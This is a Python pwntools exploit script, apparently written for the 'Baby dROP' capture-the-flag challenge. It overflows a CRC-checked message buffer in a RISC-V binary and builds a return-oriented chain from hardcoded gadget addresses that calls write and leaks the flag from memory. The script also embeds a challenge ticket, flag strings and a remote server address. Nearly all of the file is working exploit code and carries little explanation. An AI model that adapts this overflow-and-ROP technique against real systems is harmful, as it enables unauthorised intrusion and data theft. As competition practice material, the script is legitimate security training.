#!/usr/bin/env python3
import os
import subprocess

from pwn import *
from zlib import crc32


def spawn_gdb():
    subprocess.Popen(
        [
            "x-terminal-emulator",
            "-e",
            "gdb-multiarch",
            "./drop-baby",
            "-ex",
            "set pagination off",
            "-ex",
            "layout asm",
            "-ex",
            "target remote :1234",
            "-ex",
            "handle SIGALRM nopass",
            "-ex",
            "b *0x10faa",
            "-ex",
            "c",
        ]
    )


def connect():
    if args.LOCAL:
        with open("server.ini", "w") as server_ini:
            server_ini.write(
                """\
Application Name:Baby dROP
A1_MSG_LEN:40
A2_MSG_LEN:10
B1_MSG_LEN:20
B2_MSG_LEN:300
CC_MSG_LEN:25
ZY_MSG_LEN:0
SILENT_ERRORS:TRUE
"""
            )
        argv = ["./drop-baby"]
        # argv = ["strace", "-o", "strace.log", "-s", "300"] + argv
        tube = process(
            argv,
            env={
                **os.environ,
                "FLAG": "flag{kilo73275yankee2:GAQXaJw0jWOS4UMNA6ptgf_1PrYj9BQVqph-C78Ptc4AXpUgucOlMd_MgjgsA3QcMa6YPfUuP_dftmeX44LfGig}",
                "QEMU_GDB": "1234",
            },
        )
        spawn_gdb()
    else:
        tube = remote("drop.quals2023-kah5Aiv9.satellitesabove.me", 5300)
        tube.sendlineafter(
            b"Ticket please:\n",
            b"ticket{oscar729936hotel4:GGr93JT8OCNDImj0AzkNEeZPN8oUb0nFzKWPLXawwNUsooojNj981XQtRbJslCdHqw}",
        )
    tube.recvuntil(b"Exploit me!\n")
    return tube


def send_sync(tube):
    tube.send(b"\xde\xad\xbe\xef")


def try_get_config(tube, padding_size):
    send_sync(tube)
    content = b"A" * padding_size
    for _ in range(25):
        content += struct.pack("<I", crc32(content))
    tube.send(b"\xb1" + content)
    try:
        config_table = tube.recvline()
    except EOFError:
        return None
    assert config_table.endswith(b"Config Table\n"), config_table
    header_footer = tube.recvline()
    assert header_footer.endswith(b"-\n")
    config = []
    while True:
        config_line = tube.recvline()
        if config_line == header_footer:
            return config
        assert config_line.startswith(b"|")
        assert config_line.endswith(b"|\n")
        k, v = config_line[1:-2].decode().split(" : ")
        config.append((k.strip(), v.strip()))


#         0002146a b2 50           c.lwsp     ra,0x2c(sp)
#         0002146c 22 54           c.lwsp     s0,0x28(sp)
#         0002146e 92 54           c.lwsp     s1,0x24(sp)
#         00021470 02 59           c.lwsp     s2,0x20(sp)
#         00021472 f2 49           c.lwsp     s3,0x1c(sp)
#         00021474 62 4a           c.lwsp     s4,0x18(sp)
#         00021476 45 61           c.addi16sp sp,0x30
#         00021478 82 80           ret
LINK = 0x2146A
#         0x00020f54 : c.mv a2, s3
#                      c.addi4spn a1, sp, 0x10
#                      c.mv a0, s4
#                      c.jalr s1
CALL = 0x20F54
WRITE = 0x218DA


def main():
    for padding_size in range(4):
        with connect() as tube:
            config = try_get_config(tube, padding_size)
            if config is None:
                continue
            for k, v in config:
                print(f"{k}:{v}")
            ((_, b2_msg_len),) = filter(lambda kv: kv[0] == "B2_MSG_LEN", config)
            b2_msg_len = int(b2_msg_len)
            send_sync(tube)
            # do_b2:
            #     s0 = sp + 0x90
            #     buf = s0 - 0x78 = sp + 0x18
            #     n_read = s0 - 0x14 = buf + 0x64
            #     ra = sp + 0x8c = buf + 0x74
            leak_len = 750
            content = flat(
                {
                    0x64: struct.pack("<I", b2_msg_len),  # n_read=b2_msg_len
                    0x74: struct.pack("<I", LINK),  # ra=LINK
                    0x78 + 0x18: struct.pack("<I", 1),  # s4=fd
                    0x78 + 0x1C: struct.pack("<I", leak_len),  # s3=len
                    0x78 + 0x24: struct.pack("<I", WRITE),  # s1=WRITE
                    0x78 + 0x2C: struct.pack("<I", CALL),  # ra=CALL
                },
                length=b2_msg_len - 4,
            )
            tube.send(b"\xb2" + content + struct.pack("<I", crc32(content)))
            print(tube.recvn(leak_len))
            # flag{oscar729936hotel4:GKh1tImHjsNrhqrkBdbKy_-5dTFesmaSdDwQqjfHzO2E0QeEntN1X5gAM-wIuPpKriJWCWLfEq5RijB-YO0DWNM}
            break


if __name__ == "__main__":
    main()
